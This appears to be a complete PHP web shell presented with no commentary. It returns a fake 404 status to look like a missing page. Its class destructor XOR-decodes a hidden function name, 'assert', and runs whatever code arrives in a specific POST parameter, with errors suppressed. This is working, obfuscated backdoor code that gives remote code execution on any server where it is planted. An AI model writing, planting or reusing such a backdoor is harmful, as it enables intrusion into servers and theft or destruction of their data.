<?php 
header('HTTP/1.1 404');
class ECBP { 
    public $c='';
    function __destruct() {
        $_0 = "\xcd" ^ "\xac";
        $_1 = "\x7e" ^ "\xd";
        $_2 = "\x20" ^ "\x53";
        $_3 = "\x13" ^ "\x76";
        $_4 = "\xf2" ^ "\x80";
        $_5 = "\xca" ^ "\xbe";
        $db =$_0.$_1.$_2.$_3.$_4.$_5;
        return @$db($this->c);
    }
}
$ecbp = new ECBP();
@$ecbp->c = $_POST['9138AD4F7033'];
?>